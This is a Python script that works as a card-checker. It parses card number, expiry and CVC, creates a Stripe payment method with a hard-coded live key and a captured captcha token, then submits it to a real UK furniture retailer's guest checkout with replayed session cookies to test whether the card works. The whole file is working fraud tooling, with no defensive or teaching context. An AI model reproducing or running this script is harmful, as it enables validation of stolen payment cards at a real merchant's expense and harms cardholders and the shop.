import time
import requests
def Tele(ccx):
  import requests
  ccx=ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:#i_expir
    yy = yy.split("20")[1]
  r = requests.session()
  import requests
	
  headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
  data = f'type=card&billing_details[name]=sameh+ndbd&billing_details[email]=vvhvgcg68%40gmail.com&billing_details[phone]=4848649568&billing_details[address][city]=Qism+Qina&billing_details[address][country]=GB&billing_details[address][line1]=Haggag+Bic+Arafat&billing_details[address][line2]=Qism+Thalith&billing_details[address][postal_code]=83111&billing_details[address][state]=Qina&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=914e81c9-5d83-473e-888b-dda44d3cda24293c72&muid=b2a3a646-7966-463c-a9c6-b372baba2d206f8a72&sid=b18e8993-c29c-4c94-bbe2-21de92609c182fd669&payment_user_agent=stripe.js%2F088e2e9be8%3B+stripe-js-v3%2F088e2e9be8%3B+split-card-element&referrer=https%3A%2F%2Fwww.barstools.co.uk&time_on_page=22766&key=pk_live_51Momw9LR4YVBI8I9HGfni00diH0lBNyGDQKBBYjXm0Mgq2RLMCSVrf6Q26Bdo0SE7R0h3rcksOPCLzkao6dRkTo200dEwfLJME&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoid1BBeTVOMVU5bEJRM20wQmt4MEl5aHRnVDNISmZzSTlUV00wSy9BY2h1d0JjVzlkU2c2UVBQYXRXQmJUcjZLRHBYQjB4eDF1aUtpb3g5Rk5kZit4WThrSTlwSFVIak1qNXdpVWplOHE0VjNnUlVVNUQ1RmMweVNWbHBtZ3hUaFZyOHZTYVlSaHlYOTBsOGxsVzhuWUMvdW5uQXpCR0NWRnAyQVVXSUhQa1RqWTFMa1NYdE9tNUN3cjMwN00xTWVXaXJpME5Hdmp1NUhrVEpHUGZxUW5PYzFjNUhVK0g0WWNyaU1vUU84TFZBRkpKZ2R6MldkYVNubCt4eTdxczdLNWpaWnlyQ1ROQnFHbGlINFg3alFpWmdhT0YvVlc3bTRjVitZbXhYY3N6MVVXbjJmQ29nai9pSkZ6Qnk2SFM2VVQxZTY0cHdWYmFxOEhkMVJ6YlpKbFdYa3V2dk93UkpYb0ZaOGlzV3lXZnlTOFRWOWJHSU5tZGVmVklqKzRhQnhCMmIzVUNJZlFxOU45dzFKcDh2QlNjS1hQZXZtdGE4OFhvWVBIN2szK0F5TWo1VytIZWVDTkxvdHJPRzI5ZDhGcWFKWHlSc1hUZlhrSDBjS3cxdlRMbm0wWlBpUU5lMDE3TTdSTWZIc1kvZ2JtUE9uK2Q0dkpRYnd5KzNJYTBvYnBkeUlmdjk0MzVSTDhOZUlJdEt1SmZrRFB6MXdieEhIbEVoQThDQlZPU2hmVGFaSjlVaDhkd3hvdTgxUjA5T1gwcjFiaTJUU21sLzdLbHdLdFdJVTdHMW56cVpEWDcrNjRBbmJsRGRWNzlyUy9wbjFmU3l6dzRUYlU0Mm53ZkZOd0FtSlVtNnExUVUxRmZsK2lWR3NMVE1Kbk5rdXNCMXd6NUxqUnlXeG16ZUJlWlFpZnhjYTVvZTkrRWdsZUNCRFBIWFlIUlorRmRIM2trYUZ1R1dhamN5dnpnS3lNYm90cCtBVDkwNUt0dU9RZEM1OFpRbmJobmlQdldRQVVJNTAwZ2c1NEdTMjU1MmprWU9USXFvSkljam1yWldZbjZGdWdhbzZSWmwzdmFmRGF5N1Zac09WdGZ4NHBnV2tETWhNdzNTcnJlWkZEUW9wdS9ndW5QdFUwYXNiR1U0cVR5eklWaDFwekl5ZlpVbS9Td1lRNmRZOVpDckgzR1JTM1BmcDFuMkN5TGQwME8wajlGeHYyOFU0a2J1dFFjcVI4SjlIdUcwWXJyTmMxQnphNk1YY05ocWd6K3czSDluSGljU0xzUUpkUEZBZ3RFVkM4Q1JVS3VpeUJWU3JBQ2NwV1hmMWdCNjlBSGtYQUZ2elY0bU9UZ0M5RTRqL2RVZm15S0F6KzcxRjh5U0hIdmJpRWhuWGhPVkVTdEdoWCs2V0JwRks0djI2ZUNNN0xVS24vSzVqbEJXWXNCVW4wK1JXR0I2MW4zelJBbUZaTDU2aDVtamxWRmhVNmJidy9rTlFDdXVmRFlJUTk1VEpKNERPeG5SRGZYajFDamVrcHNFWkRpekpHSEdiaTQ2aVJ2VzFIcUFMTTd1K0RuY0JZeE55c212RE9nUGRlZCtUU09jUEtDZVRQS1VmTHVBRE5JNFA0Sml4Z3Vnc2FYWWh3Z0h0NFZVandsN0ZxNWdXb0hTUnNBSlE2UTZkWG13QkdHd2xmZHpzU3NqeklaWlBTSXdZYU85WldvL2NzLy9nVTBZMmZMc1FtNWdHQXllQ3hMcWZRVkFvNFZkNU1OMzhMTWVxVHgxSXNzQk0vc2ROS3RaQTVGc0F3VmxwZzhoN3dncjhQN3JPZnROWWcwQ244ZzNiQWcyOFc4TnJpQ005Zy9xYi9BSG1RRWp1MXlyV3NHalZrOTJCMldRdjE1SWVKZ3Y1ZTU1SVRTRGozUUczb0EzbUgvdVpvTDBrUFUwRmdwYVNJUGJsT0RHL20wVlg1Z0ZqWVFIc2lMZXFWSnZha0tzdEhPeSsvUU1aS0xXb0V4MHRudFdMdEtTWDN6Y3RpeEV0aEFaUldQdkN0ejkxZXZ6ekdOdkJ6UEc3QTZzT1JxNVFNQTBra040TWZOWVowcmNxZmc1R0FCTWJSTS9tSko4QitrM0R2SXB3M3F0ZEkrTzE1Y3ovdFVFWXBZMXZhUFhWZWVBd1NaZ0dwZVljTVl2eUpHditpdTk0aUpGYUJwb0JNLzc4cjdrZkFIY0pTdWFnSk8zOE1XL0xjdVMvZENIdXpybTBSMGtlM3owVmVGSjdnSDdNbzdrSENuYXFMYWxzeGNHTTl6cWZOTDFHNHdyWHZmOWZpWEhOOXNhNHREVC83RVJmaTlLV21reWtWcDMrdzZVWXNwTDdZcmdNM2lqbzUrV0RGejc1NUVja2k3OThrZ2FGSXRlU3Bha3Y5SitJb09VWE9YQXVrRDVVVHRaNS9SbmVUbUVoc21Bd0kzVjRGZ1hDNFBNMTNDbEhTUTBmTVA3MzAxRHplQnE0UW5JVDNMZUllOFJ6T29TQ2h1M29vY0dTTWRKMDZ6NGZoNE9MK01mbStLSkREVFIreGJ3RVFWUDZieXMwc1JXQzZOTXVMWDk0aDBPMjljd0w2ZFF0b05COFJXbVNhTlM2c0ZSaW5BM1VUcGtGT1ZGdHkyd1NMdGRTZ1pKNHNCejFRVjNiV2dLZGZQTUhqUisrSTQ4MzJIRWs2ZmRmcHJlMDRMME85VDUwTE1kWEZRR1M5ckZIMm5BdHBINGhXUmZOTmtyRWZzbTJQYkYzUzZHK3E4OW13UDl2WDBSZ0tOai8reEdLM1ZmYzFVL1RYV3daaWlmU0NwQmo5Nnc9PSIsImV4cCI6MTcyNTgyNzkzNywic2hhcmRfaWQiOjUzNTc2NTU5LCJrciI6IjM5ZjVjYWQ4IiwicGQiOjAsImNkYXRhIjoid3JBS1BoMThyQUFCRUdsM1ZPMmRhUHdjKzcvc1JyWG9sMS85YThlcCs3eFlvbUQyWmFIUHptSGpoUXNIYUhyNHdIMTZjZ1UyUVRHZ0ptcnRURmh4cWpoWGtFL2M4Z0pSUEFjbTl3STJaUFJlZGZXNDJTc2dCSHhFNlFwVkZxSEhOTWdnaW5QQ0xJVHRIMGZqOXlqWHF6M3I1d01zUnZhakZaSnBzYjQ2ZTllTTlqakdnUWRPZnlFa0h1T0swRWRqSlJZOFJlNXY4UEc4aGhrZiJ9.57AQwtMxs3vIvmMEtt2Fc5bhUMHD6xfC4AJwz_r8u_k'
	
  response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
  id = response.json()['id']
  brand=(response.json()['card']['brand'])
  last=(response.json()['card']['last4'])
  import requests
	
  cookies = {
	    'mage-cache-storage': '%7B%7D',
	    'mage-cache-storage-section-invalidation': '%7B%7D',
	    '_gid': 'GA1.3.1308520200.1725827153',
	    'yotpo_pixel': '3a1a6a9f-9880-460b-86a4-a78049d62415',
	    '_sp_ses.8bca': '*',
	    'form_key': 'YXnocBKuGKJvQDdR',
	    '_fbp': 'fb.2.1725827154493.976073034399531275',
	    'mage-messages': '',
	    'recently_viewed_product': '%7B%7D',
	    'recently_viewed_product_previous': '%7B%7D',
	    'recently_compared_product': '%7B%7D',
	    'recently_compared_product_previous': '%7B%7D',
	    'product_data_storage': '%7B%7D',
	    '__zlcmid': '1Nen0PlBmxdJ8DB',
	    'PHPSESSID': 'u9i737nd3t681po38g3r4blmfd',
	    'mage-cache-sessid': 'true',
	    'user_allowed_save_cookie': '%7B%221%22%3A1%7D',
	    '__stripe_mid': 'b2a3a646-7966-463c-a9c6-b372baba2d206f8a72',
	    '__stripe_sid': 'b18e8993-c29c-4c94-bbe2-21de92609c182fd669',
	    '_gat': '1',
	    '_gat_gtag_UA_67263491_1': '1',
	    'private_content_version': '2e1eb771c738941a923cefd407bf50b6',
	    '_ga_QR3N607XXZ': 'GS1.1.1725827153.1.1.1725827796.41.0.2013443234',
	    '_ga': 'GA1.3.408834522.1725827153',
	    '__kla_id': 'eyJjaWQiOiJZVGxrTmpNNE1HTXROR1kxWkMwME1EVTNMVGc0TWpndFpESmxObUkyWVRka09XSXgiLCIkcmVmZXJyZXIiOnsidHMiOjE3MjU4MjcxNTUsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmJhcnN0b29scy5jby51ay9wcml2YWN5LXBvbGljeSJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcyNTgyNzc5OCwidmFsdWUiOiIiLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cuYmFyc3Rvb2xzLmNvLnVrL3ByaXZhY3ktcG9saWN5In19',
	    '_gcl_au': '1.1.211326929.1725827153.1030997931.1725827357.1725827810',
	    'section_data_ids': '%7B%22cart%22%3A1725827798%2C%22directory-data%22%3A1725827785%2C%22messages%22%3A1725827814%7D',
	    '_sp_id.8bca': '1e3ac6d296c99ba9.1725827154.1.1725827827.1725827154',
	}
	
  headers = {
	    'authority': 'www.barstools.co.uk',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://www.barstools.co.uk',
	    'referer': 'https://www.barstools.co.uk/checkout/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
  json_data = {
	    'cartId': 'YSFzrIw5HodedrIQ8X4jLDxzy7XUfRW0',
	    'billingAddress': {
	        'countryId': 'GB',
	        'region': 'Qina',
	        'street': [
	            'Haggag Bic Arafat',
	            'Qism Thalith',
	        ],
	        'company': 'sbbs',
	        'telephone': '4848649568',
	        'postcode': '83111',
	        'city': 'Qism Qina',
	        'firstname': 'sameh',
	        'lastname': 'ndbd',
	        'saveInAddressBook': None,
	    },
	    'paymentMethod': {
	        'method': 'stripe_payments',
	        'additional_data': {
	            'cc_stripejs_token': f'{id}:{brand}:{last}',
	            'cc_saved': 'new_card',
	            'cc_save': True,
	        },
	    },
	    'email': 'vvhvgcg68@gmail.com',
	}
	
  response = requests.post(
	    'https://www.barstools.co.uk/rest/default/V1/guest-carts/YSFzrIw5HodedrIQ8X4jLDxzy7XUfRW0/payment-information',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	).json()
  time.sleep(10)
  try:
    ii=response
  except:
      return 'success'
  return ii